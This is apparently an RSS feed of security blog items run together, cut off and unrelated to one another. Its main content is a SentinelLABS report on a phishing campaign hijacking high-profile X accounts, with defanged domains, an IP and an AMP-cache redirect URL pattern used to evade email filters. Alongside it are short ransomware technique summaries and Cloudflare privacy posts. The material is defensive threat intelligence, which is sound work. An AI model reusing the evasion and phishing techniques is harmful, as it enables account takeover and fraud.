&lt;ul&gt;
&lt;li&gt;A recently discovered ransomware called Windows Locker, first observed on GitHub in December 2024, &lt;a href="https://www.cyfirma.com/research/windows-locker-ransomware/"&gt;targets&lt;/a&gt; victims by encrypting files and modifying registry keys for persistence. It prevents standard recovery methods and uses AES encryption techniques to encrypt data. Additionally, Windows Locker deletes shadow copies, leaving users unable to retrieve manipulated files.&lt;/li&gt;
&lt;li&gt;A technical analysis of Arcus Media ransomware &lt;a href="https://www.halcyon.ai/blog/arcus-media-ransomware-displays-novel-process-targeting-selective-encryption-and-recovery-disruption"&gt;shows&lt;/a&gt; it elevates privileges using the ShellExecuteExW API without administrative access and maintains registry-based persistence. It halts critical processes like SQL servers and email clients via the CreateToolhelp32Snapshot API, encrypts files with the ChaCha20 cipher adding &amp;#8220;[Encrypted].Arcus&amp;#8221; to filenames, and hinders recovery by deleting shadow backups, disabling system recovery, and clearing event logs.&lt;/li&gt;

&lt;ul&gt;
&lt;li&gt;An active phishing campaign is targeting high-profile X accounts in an attempt to hijack and exploit them for fraudulent activity.&lt;/li&gt;
&lt;li&gt;This campaign has been observed targeting a variety of individual and organization accounts such as U.S. political figures, leading international journalists, an X employee, large technology organizations, cryptocurrency organizations, and owners of valuable, short usernames.&lt;/li&gt;
&lt;li&gt;SentinelLABS’ analysis links this activity to a similar operation from last year that successfully compromised multiple accounts to spread scam content with financial objectives. While the activity detailed here is centered around X/Twitter accounts, this actor is not limited to a single social platform, and can be observed directing attention to other popular services as well, while seemingly pursuing the same financial objectives.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you’ve encountered similar suspicious activity, SentinelLABS would love to hear from you — please reach out to the team at &lt;a href="mailto:ThreatTips@sentinelone.com" rel="noopener noreferrer" target="_blank"&gt;ThreatTips@sentinelone.com&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Account Compromise Process&lt;/h2&gt;
&lt;p&gt;Thanks to tips from targets and collaboration with industry partners, SentinelLABS has observed a variety of phishing lures tied to this campaign over the past few weeks. One example is the classic account login notice. The links in the email received by the target are not legitimate and lead to credential phishing sites. Other observed lures use copyright violation themes. However, SentinelLABS notes that directly phishing users may not be the only access method employed by this attacker.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113633" style="width: 760px;"&gt;&lt;img alt="" class="wp-image-113633 size-full" height="1320" src="https://www.sentinelone.com/wp-content/uploads/2025/01/new-login-phishing-email.jpg" width="760" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113633"&gt;An X ‘new login’-themed phishing email&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;In recent cases, we observed the actor abusing Google&amp;#8217;s &amp;#8220;AMP Cache&amp;#8221; domain &lt;code&gt;cdn.ampproject[.]org&lt;/code&gt; to evade email detections and redirect the user to a phishing domain:&lt;/p&gt;
&lt;pre&gt;https://cdn.ampproject[.]org/c/s/x-recoverysupport.com/reset/?username=[X-USERNAME]&lt;/pre&gt;
&lt;p&gt;This ultimately leads the targets to an actor-made phishing website seeking X account credentials:&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113632" style="width: 684px;"&gt;&lt;img alt="" class="wp-image-113632 size-full" height="792" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-creds-phishing-page.jpg" width="684" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113632"&gt;X credential phishing page&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;In the copyright infringement lure scenario, the user will first visit an Action Needed page before being prompted to enter credentials:&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113631" style="width: 1514px;"&gt;&lt;img alt="" class="size-full wp-image-113631" height="786" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement.jpg" width="1514" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113631"&gt;X fake copyright infringement page&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Once an account is taken over, the attacker swiftly locks out the legitimate owner and begins posting fraudulent cryptocurrency opportunities or links to external sites designed to lure additional targets, often with a crypto theft-related theme. Ultimately, compromising high-profile accounts enables the attacker to reach a broader audience of potential secondary victims, maximizing their financial gains.&lt;/p&gt;
&lt;h2&gt;Widespread Activity&lt;/h2&gt;
&lt;p&gt;In recent activity associated with this campaign, the domain &lt;code&gt;securelogins-x[.]com&lt;/code&gt; has been used to deliver emails and &lt;code&gt;x-recoverysupport[.]com&lt;/code&gt; to host phishing pages. Our observations indicate a level of informality and flexibility of infrastructure use – meaning any of these domains can be considered email delivery or phishing page hosting.&lt;/p&gt;
&lt;p&gt;An overall collection of recent activity can be observed hosted on &lt;code&gt;84.38.130[.]20&lt;/code&gt;, an IP associated with a Belize-based VPS service called Dataclub. The domains themselves have been predominantly registered through Turkish hosting provider Turkticaret.&lt;/p&gt;
&lt;p&gt;Inspecting the DNS history of &lt;code&gt;84.38.130[.]20&lt;/code&gt; leads to a variety of interestingly related domains. As shown below, the cluster of activity began in mid-2024 and continues today. While this is only one phishing page hosting IP, it provides a good perspective of the length of this activity and its ability to avoid much attention for over a year.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113630" style="width: 1558px;"&gt;&lt;img alt="" class="size-full wp-image-113630" height="886" src="https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis.jpg" width="1558" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113630"&gt;Validin Infrastructure Analysis Timeline&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Our observations suggest that the attacker is highly adaptable, continuously exploring new techniques while maintaining a clear financial motive. The targeting appears constrained, yet opportunistic. Notably, past public reports have attributed related activity to Turkish-speaking actors based on language phishing page source comment language. At this time, we do not attribute this campaign to a specific country or any widely-tracked threat actor.&lt;/p&gt;
&lt;p&gt;Some of the malicious sites and content hosted across &lt;code&gt;84.38.130[.]20&lt;/code&gt; are built using the FASTPANEL DIRECT service.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113629" style="width: 1046px;"&gt;&lt;img alt="" class="size-full wp-image-113629" height="836" src="https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page.jpg" width="1046" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113629"&gt;FASTPANEL landing page on buy-tanai[.]com&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;FASTPANEL is a website hosting and building service that specializes in rapid building and management of websites. While FASTPANEL is not a malicious service, it is frequently abused by bad actors due to the ease of use, rapid scalability, and relatively low cost. FASTPANEL is routinely utilized by drainer gains and phishing campaigns, and is also included in associated guides and tutorials distributed throughout cybercrime communication channels.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113628" style="width: 1556px;"&gt;&lt;img alt="" class="size-full wp-image-113628" height="664" src="https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL.jpg" width="1556" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113628"&gt;Example discussion of FASTPANEL (RU crime forum)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Of the sites hosted on &lt;code&gt;84.38.130[.]20&lt;/code&gt;, the &lt;code&gt;buy-tanai[.]com&lt;/code&gt; and &lt;code&gt;emotionai[.]live&lt;/code&gt; sites still present the FASTPANEL landing pages as of this writing.&lt;/p&gt;
&lt;h2&gt;Publicly Linkable Activity&lt;/h2&gt;
&lt;h3&gt;Emerging Account Intrusions&lt;/h3&gt;
&lt;p&gt;While we have not yet established a high-confidence link, a recent compromise of a Tor Project account closely mirrors our observations. On January 30, 2025, the official X account for the Tor Project was breached. While it is possible that the same threat actor is responsible, we lack sufficient evidence to confirm the connection as of this writing.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113627" style="width: 1534px;"&gt;&lt;img alt="" class="size-full wp-image-113627" height="1018" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp.jpg" width="1534" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113627"&gt;X post from The Tor Project account on January 30, 2025 advising users of a potential compromise&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113626" style="width: 1522px;"&gt;&lt;img alt="" class="wp-image-113626 size-full" height="762" src="https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice.jpg" width="1522" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113626"&gt;Tor Project account compromise notice&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The Decentralized Autonomous Wireless Network (DAWN) was another victim of this type of attack. The threat actor &lt;a href="https://coinpedia.org/news/dawn-internets-x-account-hacked-phishing-scams-target-users-via-telegram/" rel="noopener noreferrer" target="_blank"&gt;leveraged&lt;/a&gt; the compromised DAWN-related social media accounts to lure victims into entering credentials into phishing pages targeting X and Telegram credentials.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113625" style="width: 1354px;"&gt;&lt;img alt="" class="size-full wp-image-113625" height="1358" src="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post.jpg" width="1354" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113625"&gt;DAWN X Posts&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The compromise of DAWN’s X accounts goes back to mid-January 2025.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113624" style="width: 960px;"&gt;&lt;img alt="" class="size-full wp-image-113624" height="1106" src="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post.jpg" width="960" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113624"&gt;January 14, 2025 &amp;#8211; DAWN rewards compromise post&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h3&gt;Crypto-Themed Project Placeholders&lt;/h3&gt;
&lt;p&gt;In some cases, we’ve observed cryptocurrency themed projects seemingly acting as placeholders for future use, or direct pump-and-dump schemes. In one example, &lt;code&gt;buy-tanai[.]com&lt;/code&gt; was &lt;a href="https://pump.fun/coin/G8pMUeoRVVDQu2hJSzxNPBGWtgtt5BjQ9nCT2BmVpump" rel="noopener noreferrer" target="_blank"&gt;pitched&lt;/a&gt; as such: “&lt;i&gt;$TANA AI. Dawn&amp;#8217;s AI project, Tana is the first AI-powered LP and trading agent, now live on the Solana blockchain.”&lt;/i&gt;&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113623" style="width: 1516px;"&gt;&lt;img alt="" class="size-full wp-image-113623" height="338" src="https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun.jpg" width="1516" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113623"&gt;Tana AI (TANA) on Pump[.]fun&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The domain&lt;code&gt;buy-tanai[.]com&lt;/code&gt; currently displays default FASTPANEL landing pages, suggesting it — along with other similar domains — is being staged for future attacks. Since FASTPANEL-managed sites can be rapidly updated, these domains serve as adaptable templates for phishing campaigns.&lt;/p&gt;
&lt;p&gt;Notably, TANA AI (TANA) was launched by Dawn in mid-January to promote AI-driven trading and liquidity provision in the cryptocurrency market. Despite losing most of its initial value within days, the currency remains actively traded across multiple decentralized exchanges.&lt;/p&gt;
&lt;p&gt;Given the crypto-related nature of these domains, it is likely that threat actors are using them as flexible phishing infrastructure. By keeping them as blank templates, they can quickly modify hosted content to align with ongoing campaigns as needed.&lt;/p&gt;
&lt;h3&gt;Crimeware Relations&lt;/h3&gt;
&lt;p&gt;Several other domains share overlaps in both use and unique infrastructure details, yet they represent a fork from the previously described high-profile social media profile attacks, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dataoptimix[.]com&lt;/li&gt;
&lt;li&gt;gamecodestudios[.]com&lt;/li&gt;
&lt;li&gt;shortwayscooter[.]com&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The domain &lt;code&gt;shortwayscooter[.]com&lt;/code&gt; &lt;a href="https://x.com/JAMESWT_MHT/status/1883780543797723223" rel="noopener noreferrer" target="_blank"&gt;hosts&lt;/a&gt; fake captchas that deliver the DanaBot banking trojan. DataOptimix is branded as a generative AI solution, though there are few details about what the service does.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113622" style="width: 1474px;"&gt;&lt;img alt="" class="size-full wp-image-113622" height="1236" src="https://www.sentinelone.com/wp-content/uploads/2025/01/dataoptimix.jpg" width="1474" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113622"&gt;DataOptimix&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h3&gt;Historical Connections&lt;/h3&gt;
&lt;p&gt;In mid-2024, a campaign used related infrastructure in similar phishing messages, including those which &lt;a href="https://www.sportskeeda.com/us/streamers/news-linus-sebastian-responds-linus-tech-tips-official-x-account-got-hacked" rel="noopener noreferrer" target="_blank"&gt;compromised the Linus Tech Tips&lt;/a&gt; Twitter account along with several other high profile users. At the time, @LinusTech had roughly 1.8million followers, which may represent the highest profile account successfully hijacked and linked to this actor.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113621" style="width: 852px;"&gt;&lt;img alt="" class="size-full wp-image-113621" height="1556" src="https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise.jpg" width="852" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113621"&gt;Linus Tech Tips Twitter compromise&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The cryptocurrency landscape offers financially-motivated threat actors multiple opportunities for profit and fraud. While marketing for coins and tokens has long been irreverent and meme-driven, recent developments have further blurred the line between legitimate projects and scams. &lt;/p&gt;
&lt;p&gt;A striking example occurred in January 2025, when the X account of the late crypto-enthusiast and antivirus founder John McAfee was reactivated to promote a new coin, &lt;a href="https://cryptoslate.com/john-mcafee-reborn-as-ai-memecoin-and-chatbot-with-27-million-market-cap/" rel="noopener noreferrer" target="_blank"&gt;$AIntivirus&lt;/a&gt;. The marketing style and brand voice of this purportedly legitimate token closely resemble tactics used in known scam campaigns, highlighting how easily crypto enthusiasts can be misled in an already murky ecosystem.&lt;/p&gt;
&lt;p&gt;To safeguard your X account, we strongly recommend using a unique password, enabling two-factor authentication (2FA), and avoiding credential sharing with third-party services. Be especially cautious of messages containing links to account alerts or security notices. Always verify URLs before clicking, and if a password reset is needed, initiate it directly through the official website or app rather than relying on unsolicited links.&lt;/p&gt;

Elly Rostoum reveals why.</description><content:encoded>&lt;p&gt;&lt;span style="letter-spacing: 0px;"&gt;Chinese foreign direct investment should trigger American national security concerns, but much of it doesn’t. In this ‘behind closed doors’ talk at LABScon 24, Elly Rostoum reveals why and what can be done to improve our understanding of the influence of Chinese FDI.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Chinese foreign direct investment (FDI) enabled the technology revolution in China and set China as a strategic competitor to the United States. It opened new global markets, redrew trade routes, tapped into intellectual property, allowed for opportunities in industrial espionage, reshaped supply chains, and allowed for technological breakthroughs in genomics, quantum computing, artificial intelligence, and other critical and emerging technologies that are quite simply re-imagining the world.&lt;/p&gt;
&lt;p&gt;But who exactly owns the Chinese firms undertaking this FDI?&lt;/p&gt;
&lt;p&gt;The research presented by &lt;a href="https://www.labscon.io/speakers/elly-rostoum/" rel="noopener" target="_blank"&gt;Elly Rostoum&lt;/a&gt; in this LABScon 2024 keynote address tracks the incorporation structures and ownership of the 672 Chinese firms undertaking FDI globally.&lt;/p&gt;
&lt;p&gt;Taking the audience on a journey from how Chinese FDI triggers &amp;#8211; and sometimes fails to trigger &amp;#8211;  American national security concerns to the complex ownership structure of Chinese businesses operating within the U.S., Elly Rostoum reveals how the Chinese government has been able to evade American national security reviews by instrumentalizing investment through 3rd &amp;amp; 4th+ level subsidiaries, private equity, and holding companies.&lt;/p&gt;
&lt;p&gt;While much policy and attention has been focused on the investments of Chinese state-owned enterprises, Elly Rostoum argues that the real threat is “within” and buried in the details: seemingly “American” businesses that are ultimately owned by Chinese investment companies.&lt;/p&gt;

So today, on Data Privacy Day (also known internationally as Data Protection Day), we’re happy to announce that we’re adding our fourth and fifth privacy validations, and this time, they are global firsts! Cloudflare is the first organisation to announce that we have been successfully audited against the brand new &lt;a href="https://www.globalcbpr.org/privacy-certifications/"&gt;&lt;u&gt;Global Cross-Border Privacy Rules (Global CBPRs) for data controllers and the Global Privacy Recognition for Processors (Global PRP)&lt;/u&gt;&lt;/a&gt;. These validations demonstrate our support and adherence to global standards that provide for privacy-respecting data flows across jurisdictions. Organizations that have been successfully audited will be formally certified when the certifications officially launch, which we expect to happen later in 2025. &lt;/p&gt;&lt;p&gt;Our participation in the Global CBPRs and Global PRP joins our roster of privacy validations: we were one of the first cybersecurity organizations to certify to the international privacy standard &lt;a href="https://blog.cloudflare.com/iso-27701-privacy-certification/"&gt;&lt;u&gt;ISO 27701:2019&lt;/u&gt;&lt;/a&gt; when it was published, and in 2022 we also certified to the cloud privacy certification, &lt;a href="https://www.cloudflare.com/trust-hub/compliance-resources/iso-certifications/"&gt;&lt;u&gt;ISO 27018:2019&lt;/u&gt;&lt;/a&gt;. In 2023, we added our third privacy validation, undergoing a review by an independent monitoring body in the European Union (EU) and declared to be adherent to the first official GDPR code of conduct — &lt;i&gt;the &lt;/i&gt;&lt;a href="https://blog.cloudflare.com/cloudflare-official-gdpr-code-of-conduct/"&gt;&lt;i&gt;&lt;u&gt;EU Cloud Code of Conduct&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why this matters to Cloudflare customers&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-this-matters-to-cloudflare-customers"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Taking these privacy certifications together, Cloudflare demonstrates that we are meeting key official privacy validations in 39 jurisdictions around the world, from Australia and Austria to Sweden and the United States. An additional four jurisdictions (United Kingdom, Bermuda, Mauritius, and the Dubai International Finance Centre) are also in the process of joining and recognising the Global CBPR certifications. That's important for Cloudflare customers as it provides reassurance that the privacy practices we have built are recognised by governments around the world.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2RFlkr3Wht9Gu34lv2xxN9/8f3c8e5dc23963614d275dab085cd8ce/unnamed.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;What is the Global CBPR System?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-is-the-global-cbpr-system"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In the last three years, governments across the world have been busy preparing two brand-new international privacy standards. A major milestone was achieved on April 30, 2024 when &lt;a href="https://www.globalcbpr.org/global-cbpr-forum-announces-the-establishment-of-the-global-cbpr-and-global-prp-systems-and-welcomes-new-global-cape-participants/"&gt;&lt;u&gt;the Global CBPR System was established&lt;/u&gt;&lt;/a&gt;. The CBPRs are a voluntary, enforceable, international, accountability-based system that facilitates privacy-respecting data flows among members’ economies. They provide a baseline level of privacy protection for consumers through a set of rules on how to handle people’s personal information. This facilitates the free flow of data by upholding consumer privacy across participating members, despite each jurisdiction having their own individual data protection laws.&lt;/p&gt;&lt;p&gt;The CBPR System was developed by the &lt;a href="https://www.globalcbpr.org/about/membership/"&gt;&lt;u&gt;Global CBPR Forum&lt;/u&gt;&lt;/a&gt;, an intergovernmental forum between the governments of Australia, Canada, Japan, Republic of Korea, Mexico, Philippines, Singapore, Chinese Taipei, and the United States. The United Kingdom is also an associate member of the CBPR Forum, as are Bermuda, Mauritius, and the Dubai IFC, signifying their intent to join as full members in the future.&lt;/p&gt;&lt;p&gt;Over the last year, we have been busy preparing for the launch of the Global CBPR System. On May 1, 2024 — the very first day after the establishment of the system — Cloudflare applied to join. And we have now achieved the major milestone of successfully completing audits against the requirements, meaning we expect to be the first organization in the world to be newly certified to the Global CBPR system, as well as the related Global Privacy Recognition for Processors, when companies can officially be certified, which is expected later in 2025.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5F7HXXU071UJtx68KHGn41/0228087d6420c26802d77c13fafe935c/image1.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;What the Global CBPR System covers&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-the-global-cbpr-system-covers"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The Global CBPR System contains a detailed list of fifty requirements that organizations must meet in order to be certified under the scheme. The requirements derive from the nine &lt;b&gt;Global CBPR Privacy Principles&lt;/b&gt;, which are consistent with the core principles of the &lt;a href="https://www.oecd.org/"&gt;&lt;u&gt;Organisation for Economic Co-operation and Development (OECD)&lt;/u&gt;&lt;/a&gt; &lt;a href="https://www.oecd.org/en/publications/2002/02/oecd-guidelines-on-the-protection-of-privacy-and-transborder-flows-of-personal-data_g1gh255f.html"&gt;&lt;u&gt;Guidelines on the Protection of Privacy and Trans-Border Flows of Personal Data&lt;/u&gt;&lt;/a&gt;. The fifty requirements cover how organizations should collect, manage, and safeguard personal information in their custody. Organizations must meet every one of the fifty requirements in order to be Global CBPR certified. The nine principles underlying the requirements are:&lt;/p&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;p&gt;Preventing Harm&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Notice&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Collection Limitation&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p&gt;Uses of Personal Information&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Choice&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Integrity of Personal Information&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p&gt;Security Safeguards&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Access and Correction&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Accountability&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;The nine Global CBPR Privacy Principles&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;The Global CBPR certification covers the handling of personal information controlled by the organization, such as the personal details of customers, employees, and job applicants. For Cloudflare, this also includes network information — our observations about how our global cloud platform handles server, network, or traffic data generated by Cloudflare in the course of providing our services.&lt;/p&gt;&lt;p&gt;The related Global Privacy Recognition for Processors (PRP) certification covers the handling of personal information processed by the organization on behalf of a different organization, usually their customer. The eighteen requirements of the PRP relate to the two privacy principles most relevant when processing this information on behalf of another organization: &lt;i&gt;Security Safeguards and Accountability&lt;/i&gt;. For Cloudflare, this covers the processing of data pursuant to the &lt;a href="https://www.cloudflare.com/cloudflare-customer-dpa/"&gt;&lt;u&gt;Data Processing Addendum&lt;/u&gt;&lt;/a&gt; we sign with all of our customers, chiefly, the Customer Content flowing across our network and the Customer Logs generated by those data flows. Organizations must meet every one of the eighteen requirements in order to be Global PRP certified.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;A deeper dive into some of the requirements of the Global CBPRs&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#a-deeper-dive-into-some-of-the-requirements-of-the-global-cbprs"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;As noted, the key requirements of the Global CBPRs and the Global PRP cover the well-known data protection principles of notice, choice, collection limitation (data minimization), the right of data subject access and correction, providing adequate security, preventing harm, integrity of personal information, accountability, and uses of personal information. There are dozens of requirements that cover these principles, so we’ll just touch on a few of them here.&lt;/p&gt;&lt;p&gt;Let’s first look at the principle of notice. One of the more obvious requirements from the CBPRs is question 1:&lt;/p&gt;&lt;p&gt;&lt;i&gt;Do you provide clear and easily accessible statements about your practices and policies that govern the personal information described above (a privacy statement)?&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Being transparent about the collection and use of personal information is a key principle of privacy and data protection, and transparency is one of Cloudflare’s core commitments. Documenting our practices and policies in regard to how we use personal information allows individuals to decide if they want to provide their information, and that’s why it’s best practice for the privacy notice to be available and visible at the time the information is being collected. Indeed, this concept of providing notice is clear from &lt;a href="https://eur-lex.europa.eu/eli/reg/2016/679/oj/eng#art_13"&gt;&lt;u&gt;Article 13 of the EU’s GDPR&lt;/u&gt;&lt;/a&gt;. Cloudflare meets this CBPR requirement by providing a clear and accessible privacy notice visible from the footer of each page on our website. We also provide a link to the notice when we collect personal data such as through a form on a webpage.&lt;/p&gt;&lt;p&gt;In terms of how we use personal information, question 8 asks:&lt;/p&gt;&lt;p&gt;&lt;i&gt;Do you limit the use of the personal information you collect (whether directly or through the use of third parties acting on your behalf) as identified in your privacy statement?&lt;/i&gt;&lt;/p&gt;&lt;p&gt;It has long been a commitment of Cloudflare’s that we only use the personal information we collect for the purposes of providing the services we offer. Our business is built on providing customers with the tools to protect their network applications and to make them faster, more secure, more reliable, and more private. In our &lt;a href="https://www.cloudflare.com/privacypolicy/"&gt;&lt;u&gt;Privacy Policy&lt;/u&gt;&lt;/a&gt;, we commit that we will “only share or otherwise disclose your personal information as necessary to provide our Services or as otherwise described in this Policy, except in cases where we first provide you with notice and the opportunity to consent.” And we maintain internal documentation (in keeping with the CBPR’s accountability principle) to document the data we are processing and the purposes for which we process it.&lt;/p&gt;&lt;p&gt;Another key set of requirements in both the Global CBPRs and the Global PRP have to do with security safeguards. CBPR requirement question 27 asks:&lt;/p&gt;&lt;p&gt;&lt;i&gt;Describe the physical, technical and administrative safeguards you have implemented to protect personal information against risks such as loss or unauthorized access, destruction, use, modification or disclosure of information or other misuses?&lt;/i&gt;&lt;/p&gt;&lt;p&gt;The similar requirement in the Global PRP is question 2: &lt;/p&gt;&lt;p&gt;&lt;i&gt;Describe the physical, technical and administrative safeguards that implement your organization’s information security policy.&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Cloudflare has implemented an information security program in accordance with the ISO/IEC 27000 family of standards. Details of Cloudflare’s security program are documented in Annex 2 (“Technical and Organizational Security Measures”) of Cloudflare's &lt;a href="https://www.cloudflare.com/cloudflare-customer-dpa/"&gt;&lt;u&gt;Customer Data Processing Addendum&lt;/u&gt;&lt;/a&gt;, including the physical, technical and administrative safeguards implemented to protect personal information.&lt;/p&gt;&lt;p&gt;Related to the Accountability principle, question 46 asks:&lt;/p&gt;&lt;p&gt;&lt;i&gt;Do you have mechanisms in place with personal information processors, agents, contractors, or other service providers pertaining to personal information they process on your behalf, to ensure that your obligations to the individual will be met? &lt;/i&gt;&lt;/p&gt;&lt;p&gt;When we have vendors who handle any of our, or our customers’, personal information, we require them to sign a Data Processing Addendum with us. This ensures the commitments we make to our customers in our customer agreements in turn flow through to our vendors, including the security requirements — holding them, and us, accountable.&lt;/p&gt;
          &lt;div&gt;

          &lt;/div&gt;
        &lt;p&gt;We are excited about the launch of the Global CBPR certifications, expected later in 2025, and we are proud that on this Data Privacy Day, we can yet again demonstrate our commitment to universally held principles for protecting the privacy of personal data.&lt;/p&gt;&lt;p&gt;You can find more about the Global CBPR System, the Global PRP, download a full copy of the requirements, and keep up to date with related news at &lt;a href="https://www.globalcbpr.org/"&gt;&lt;u&gt;globalcbpr.org&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;For the latest information about our certifications, please visit our &lt;a href="https://www.cloudflare.com/trust-hub/compliance-resources/"&gt;&lt;u&gt;Trust Hub&lt;/u&gt;&lt;/a&gt;.

This tragic chapter in human history serves as a stark reminder of the catastrophic consequences of prejudice and extremism. &lt;/p&gt;&lt;p&gt;The United Nations General Assembly designated January 27 — the anniversary of the liberation of &lt;a href="https://en.wikipedia.org/wiki/Auschwitz_concentration_camp"&gt;&lt;u&gt;Auschwitz-Birkenau&lt;/u&gt;&lt;/a&gt; —  as International Holocaust Remembrance Day. This year, we commemorate the 80th anniversary of the liberation of this infamous extermination camp.&lt;/p&gt;&lt;p&gt;As the world reflects on this dark period, a troubling resurgence of antisemitism underscores the importance of vigilance. This growing hatred has spilled into the digital realm, with cyberattacks increasingly targeting Jewish and Holocaust remembrance and educational websites — spaces dedicated to preserving historical truth and fostering awareness.&lt;/p&gt;&lt;p&gt;For this reason, here at Cloudflare, we began to publish annual reports covering cyberattacks that target these organizations. These cyberattacks include &lt;a href="https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/"&gt;&lt;u&gt;DDoS attacks&lt;/u&gt;&lt;/a&gt; as well as &lt;a href="https://www.cloudflare.com/learning/bots/what-is-a-bot/"&gt;&lt;u&gt;bot&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://www.cloudflare.com/en-gb/learning/security/what-is-web-application-security/"&gt;&lt;u&gt;application attacks&lt;/u&gt;&lt;/a&gt;. The insights and trends are based on websites protected by Cloudflare.

